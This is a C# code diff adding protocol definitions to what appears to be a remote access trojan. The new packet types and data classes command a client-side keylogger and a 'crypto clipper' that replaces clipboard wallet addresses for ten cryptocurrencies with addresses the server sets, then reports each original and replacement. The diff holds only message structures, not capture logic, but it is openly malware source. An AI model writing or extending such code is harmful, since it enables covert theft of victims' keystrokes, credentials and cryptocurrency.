@@ -91,6 +91,19 @@ public enum PacketType
     // Fun
     FunCmd    = 160,  // server→client: {Action, Param}
     FunResult = 161,  // client→server: {Action, Result}
+
+    // Keylogger
+    KeyloggerStart     = 170,  // server→client: start capturing keys
+    KeyloggerStop      = 171,  // server→client: stop capturing keys
+    KeyloggerGetLogs   = 172,  // server→client: request buffered logs
+    KeyloggerLogsResult = 173, // client→server: {Logs, IsRunning}
+    KeyloggerClear     = 174,  // server→client: clear log buffer on client
+
+    // Crypto Clipper
+    ClipperSetConfig   = 180,  // server→client: {Enabled, Addresses:{BTC,ETH,...}}
+    ClipperGetStats    = 181,  // server→client: request stats
+    ClipperStatsResult = 182,  // client→server: {Enabled, Count, LastType, LastOrig, LastNew}
+    ClipperDetected    = 183,  // client→server: notification {Type, Original, Replaced}
 }
 
 public class Packet
@@ -322,4 +335,45 @@ public class MicDataPacket        { public string Data { get; set; } = string.Em
 // ── Fun ───────────────────────────────────────────────
 public class FunCmdData    { public string Action { get; set; } = string.Empty; public string Param { get; set; } = string.Empty; }
 public class FunResultData { public string Action { get; set; } = string.Empty; public string Result { get; set; } = string.Empty; }
+
+// ── Keylogger ─────────────────────────────────────────
+public class KeyloggerLogsResultData
+{
+    public string Logs      { get; set; } = string.Empty;
+    public bool   IsRunning { get; set; }
+}
+
+// ── Crypto Clipper ────────────────────────────────────
+public class ClipperAddresses
+{
+    public string BTC  { get; set; } = string.Empty;
+    public string ETH  { get; set; } = string.Empty;
+    public string LTC  { get; set; } = string.Empty;
+    public string XMR  { get; set; } = string.Empty;
+    public string SOL  { get; set; } = string.Empty;
+    public string TRX  { get; set; } = string.Empty;
+    public string XRP  { get; set; } = string.Empty;
+    public string DASH { get; set; } = string.Empty;
+    public string BCH  { get; set; } = string.Empty;
+    public string BNB  { get; set; } = string.Empty;
+}
+public class ClipperSetConfigData
+{
+    public bool             Enabled   { get; set; }
+    public ClipperAddresses Addresses { get; set; } = new();
+}
+public class ClipperStatsResultData
+{
+    public bool   Enabled   { get; set; }
+    public int    Count     { get; set; }
+    public string LastType  { get; set; } = string.Empty;
+    public string LastOrig  { get; set; } = string.Empty;
+    public string LastNew   { get; set; } = string.Empty;
+}
+public class ClipperDetectedData
+{
+    public string Type     { get; set; } = string.Empty;
+    public string Original { get; set; } = string.Empty;
+    public string Replaced { get; set; } = string.Empty;
+}
 
